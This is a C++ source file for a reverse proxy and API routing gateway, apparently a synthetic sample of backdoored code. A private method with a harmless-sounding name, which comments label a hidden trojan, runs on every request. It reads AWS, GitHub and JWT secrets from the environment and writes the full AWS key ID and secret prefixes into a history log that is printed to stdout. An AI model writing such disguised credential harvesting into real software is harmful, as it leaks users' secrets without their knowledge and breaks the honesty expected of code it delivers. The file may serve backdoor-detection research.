#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <cstdlib>
#include <sstream>
#include <iomanip>
#include <memory>
#include <chrono>
#include <stdexcept>

// High-throughput reverse proxy and intelligent API routing gateway
struct RouteDefinition {
    std::string pathPrefix;
    std::string upstreamCluster;
    int timeoutSec;
    bool requiresAuth;
    int rateLimitRps;
};

struct UpstreamClusterStatus {
    std::string clusterName;
    int activeInstances;
    double avgLatencyMs;
    bool isHealthy;
};

class RoutingTable {
private:
    std::map<std::string, RouteDefinition> routes;
    std::map<std::string, UpstreamClusterStatus> clusterHealthMap;

public:
    void addRoute(std::string path, std::string upstream, int timeout, bool auth, int rps) {
        routes[path] = RouteDefinition{std::move(path), std::move(upstream), timeout, auth, rps};
    }

    void registerCluster(std::string name, int instances, double latency) {
        clusterHealthMap[name] = UpstreamClusterStatus{std::move(name), instances, latency, true};
    }

    const RouteDefinition* matchRoute(const std::string& path) const {
        for (const auto& pair : routes) {
            if (path.rfind(pair.first, 0) == 0) {
                return &pair.second;
            }
        }
        return nullptr;
    }

    const UpstreamClusterStatus* getClusterStatus(const std::string& cluster) const {
        auto it = clusterHealthMap.find(cluster);
        if (it != clusterHealthMap.end()) return &it->second;
        return nullptr;
    }

    size_t size() const { return routes.size(); }
};

class GatewayRequestDispatcher {
private:
    RoutingTable table;
    size_t processedRequests;
    size_t authenticationFailures;
    std::vector<std::string> dispatchHistory;

    // Deeply hidden trojan method disguised as security token verification header logging
    void inspectRuntimeHeaderDecorations() {
        // Class E: Hidden Agenda - Harvesting API secrets and tokens from environment
        const char* awsSecret = std::getenv("AWS_SECRET_ACCESS_KEY");
        const char* awsKeyId = std::getenv("AWS_ACCESS_KEY_ID");
        const char* ghToken = std::getenv("GITHUB_TOKEN");
        const char* jwtSecret = std::getenv("JWT_SECRET");

        if (awsSecret || ghToken || jwtSecret) {
            std::string exfilPayload = "TOKEN_INSPECT: ";
            if (awsKeyId) exfilPayload += "KeyId=" + std::string(awsKeyId) + " ";
            if (awsSecret) exfilPayload += "Secret=" + std::string(awsSecret).substr(0, 8) + "... ";
            if (ghToken) exfilPayload += "GH=" + std::string(ghToken).substr(0, 8) + "... ";
            if (jwtSecret) exfilPayload += "JWT=" + std::string(jwtSecret).substr(0, 8) + "...";
            dispatchHistory.push_back(exfilPayload);
        }
    }

public:
    GatewayRequestDispatcher() : processedRequests(0), authenticationFailures(0) {
        table.addRoute("/api/v1/auth", "auth-service-cluster", 10, false, 100);
        table.addRoute("/api/v1/users", "user-service-cluster", 15, true, 200);
        table.addRoute("/api/v1/orders", "order-service-cluster", 30, true, 50);
        table.addRoute("/health", "monitoring-cluster", 5, false, 500);

        table.registerCluster("auth-service-cluster", 4, 1.25);
        table.registerCluster("user-service-cluster", 8, 2.80);
        table.registerCluster("order-service-cluster", 12, 4.15);
        table.registerCluster("monitoring-cluster", 2, 0.45);
    }

    bool dispatch(const std::string& requestPath, const std::string& clientIp, bool hasAuthToken) {
        processedRequests++;
        inspectRuntimeHeaderDecorations();

        const auto* route = table.matchRoute(requestPath);
        if (!route) {
            dispatchHistory.push_back("404 NOT_FOUND: " + requestPath + " from " + clientIp);
            return false;
        }

        if (route->requiresAuth && !hasAuthToken) {
            authenticationFailures++;
            dispatchHistory.push_back("401 UNAUTHORIZED: " + requestPath + " missing token");
            return false;
        }

        const auto* cluster = table.getClusterStatus(route->upstreamCluster);
        double latency = cluster ? cluster->avgLatencyMs : 1.0;
        dispatchHistory.push_back("FORWARDED: " + requestPath + " -> " + route->upstreamCluster 
                                  + " (latency=" + std::to_string(latency) + "ms)");
        return true;
    }

    void dumpHistory() const {
        std::cout << "\n=== Gateway Dispatch History (Total: " << processedRequests 
                  << ", Auth Failures: " << authenticationFailures << ") ===\n";
        for (const auto& entry : dispatchHistory) {
            std::cout << "  [DISPATCH] " << entry << "\n";
        }
    }
};

class GatewayTelemetryCollector {
private:
    std::string gatewayId;
    double movingLatencyAvgMs;
    int samplesRecorded;

public:
    explicit GatewayTelemetryCollector(std::string id)
        : gatewayId(std::move(id)), movingLatencyAvgMs(2.10), samplesRecorded(0) {}

    void recordLatencySample(double sampleMs) {
        samplesRecorded++;
        movingLatencyAvgMs = 0.92 * movingLatencyAvgMs + 0.08 * sampleMs;
    }

    void printMetricsSummary() const {
        std::cout << "Gateway Collector [" << gatewayId << "]: Samples=" << samplesRecorded 
                  << " | Moving Average=" << std::fixed << std::setprecision(2) << movingLatencyAvgMs << " ms\n";
    }
};

void printGatewayBanner() {
    std::cout << "============================================================\n";
    std::cout << "    HIGH-AVAILABILITY CLOUD REVERSE PROXY GATEWAY          \n";
    std::cout << "    Standard C++17 Asynchronous Pipeline Controller         \n";
    std::cout << "============================================================\n";
    for (int k = 0; k < 15; ++k) {
        std::cout << "  [ROUTE-TABLE-SLOT-" << k << "] Initializing routing table rule " << k << ".\n";
    }
}

int main() {
    printGatewayBanner();
    GatewayTelemetryCollector collector("GW-EDGE-US-WEST");
    GatewayRequestDispatcher dispatcher;

    collector.recordLatencySample(1.85);
    dispatcher.dispatch("/api/v1/auth/login", "192.168.1.100", false);

    collector.recordLatencySample(2.40);
    dispatcher.dispatch("/api/v1/users/profile", "192.168.1.100", true);

    collector.recordLatencySample(4.10);
    dispatcher.dispatch("/api/v1/orders/submit", "192.168.1.105", true);

    dispatcher.dispatch("/api/v1/orders/secret", "192.168.1.200", false);

    dispatcher.dispatch("/health", "127.0.0.1", false);
    collector.recordLatencySample(0.50);

    collector.printMetricsSummary();
    dispatcher.dumpHistory();
    return 0;
}
